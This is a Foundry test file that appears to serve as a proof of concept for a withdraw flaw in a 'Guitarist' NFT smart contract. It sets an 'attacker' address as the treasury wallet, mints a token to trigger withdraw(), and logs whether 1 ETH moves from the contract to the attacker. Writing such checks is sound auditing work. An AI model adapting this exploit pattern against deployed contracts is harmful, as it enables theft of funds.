// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.13;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/Guitarist.sol";

contract GuitaristTest is Test {
    Guitarist guitarist;
    address owner = address(0xABCD);
    address attacker = address(0xBAD);
    
    function setUp() public {
        vm.startPrank(owner);
        guitarist = new Guitarist("initNotRevealedUri", "contractURI");
        guitarist.setTreasuryWallet(attacker);
        vm.stopPrank();
    }

    function testWithdrawVulnerability() public {
        // Force ether into the contract to simulate accumulated funds
        vm.deal(address(guitarist), 1 ether);
        
        // BEFORE: Record balances
        uint256 contractBalanceBefore = address(guitarist).balance;
        uint256 attackerBalanceBefore = attacker.balance;
        
        console.log("--- BEFORE-Trigger Withdraw ---");
        console.log("Contract ETH balance:", contractBalanceBefore);
        console.log("Attacker ETH balance:", attackerBalanceBefore);
        
        console.log("--- Trigger: mint(1) ---");
        // Owner mints a token (free for owner), which triggers withdraw()
        vm.prank(owner);
        guitarist.mint(1);
        
        // AFTER: Record balances
        uint256 contractBalanceAfter = address(guitarist).balance;
        uint256 attackerBalanceAfter = attacker.balance;
        
        console.log("--- AFTER-Trigger Withdraw ---");
        console.log("Contract ETH balance:", contractBalanceAfter);
        console.log("Attacker ETH balance:", attackerBalanceAfter);
        
        // Compute differences
        uint256 contractBalanceDiff = contractBalanceBefore - contractBalanceAfter;
        uint256 attackerBalanceDiff = attackerBalanceAfter - attackerBalanceBefore;
        
        console.log("Contract balance reduced by:", contractBalanceDiff);
        console.log("Attacker balance increased by:", attackerBalanceDiff);
        
        // Final vulnerability verdict based on state changes
        if (contractBalanceDiff == 1 ether && attackerBalanceDiff == 1 ether) {
            console.log("Vulnerability Exists: Contract lost 1 ETH and attacker gained 1 ETH");
        } else {
            console.log("Vulnerability not Exist: State changes do not indicate successful exploit");
        }
    }
}